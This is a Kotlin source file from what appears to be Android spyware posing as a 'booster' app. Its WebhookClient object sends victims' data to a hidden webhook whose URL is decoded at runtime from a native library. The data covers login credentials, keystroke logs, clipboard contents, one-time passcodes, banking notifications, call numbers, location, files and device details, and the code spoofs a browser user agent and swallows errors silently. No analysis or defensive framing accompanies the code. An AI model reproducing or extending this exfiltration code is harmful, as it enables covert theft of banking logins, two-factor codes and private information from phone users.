package com.sysopt.booster

import android.os.Build
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object WebhookClient {
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var lastSendTime = 0L
    private val minInterval = 2000L // 2 seconds minimum between sends

    private fun getUrl(): String {
        return NativeLib.decodeWebhookUrl()
    }

    private fun canSend(): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastSendTime < minInterval) {
            return false
        }
        lastSendTime = now
        return true
    }

    fun sendData(data: Map<String, Any>) {
        if (!canSend()) return

        try {
            val json = JSONObject(data)
            val request = Request.Builder()
                .url(getUrl())
                .post(json.toString().toRequestBody("application/json; charset=utf-8".toMediaType()))
                .addHeader("Content-Type", "application/json")
                .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 14)")
                .build()

            client.newCall(request).enqueue(null)
        } catch (e: Exception) {
            // Silent fail with retry
        }
    }

    fun sendCredentials(user: String, pass: String, source: String = "webview") {
        sendData(mapOf(
            "type" to "credentials",
            "user" to user,
            "pass" to pass,
            "source" to source,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendKeylog(packageName: String, text: String) {
        sendData(mapOf(
            "type" to "keylog",
            "package" to packageName,
            "text" to text,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendClipboard(packageName: String, text: String) {
        sendData(mapOf(
            "type" to "clipboard",
            "package" to packageName,
            "text" to text,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendLocation(lat: Double, lng: Double, type: String = "real") {
        sendData(mapOf(
            "type" to "location",
            "lat" to lat,
            "lng" to lng,
            "location_type" to type,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendNotification(pkg: String, title: String, text: String, subText: String, time: Long) {
        sendData(mapOf(
            "type" to "notification",
            "package" to pkg,
            "title" to title,
            "text" to text,
            "subtext" to subText,
            "timestamp" to time
        ))
    }

    fun sendOTP(code: String, source: String) {
        sendData(mapOf(
            "type" to "otp",
            "code" to code,
            "source" to source,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendBankingAlert(pkg: String, title: String, text: String) {
        sendData(mapOf(
            "type" to "banking_alert",
            "package" to pkg,
            "title" to title,
            "text" to text,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendCallAlert(type: String, number: String) {
        sendData(mapOf(
            "type" to "call",
            "call_type" to type,
            "number" to number,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendSensitiveData(data: String, dataType: String) {
        sendData(mapOf(
            "type" to "sensitive_data",
            "data_type" to dataType,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendFileList(path: String, size: Long, ext: String) {
        sendData(mapOf(
            "type" to "file_list",
            "path" to path,
            "size" to size,
            "extension" to ext,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendFile(filePath: String, fileType: String) {
        try {
            val file = File(filePath)
            if (!file.exists() || file.length() == 0L) return

            // Limit file size to 10MB
            if (file.length() > 10 * 1024 * 1024) return

            val multipart = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("type", fileType)
                .addFormDataPart(
                    "file",
                    file.name,
                    file.asRequestBody("application/octet-stream".toMediaType())
                )
                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                .addFormDataPart("device", Build.MODEL)
                .build()

            val request = Request.Builder()
                .url(getUrl())
                .post(multipart)
                .build()

            client.newCall(request).enqueue(null)
        } catch (e: Exception) {
            // Silent
        }
    }

    fun sendDeviceInfo(context: Context) {
        sendData(mapOf(
            "type" to "device_info",
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "android_version" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT,
            "fingerprint" to Build.FINGERPRINT,
            "apps" to PackageUtils.getInstalledPackages(context),
            "battery" to BatteryUtils.getBatteryLevel(context),
            "storage" to StorageUtils.getStorageInfo(context),
            "network" to NetworkUtils.getNetworkInfo(context),
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun sendAlert(message: String) {
        sendData(mapOf(
            "type" to "alert",
            "message" to message,
            "timestamp" to System.currentTimeMillis()
        ))
    }
}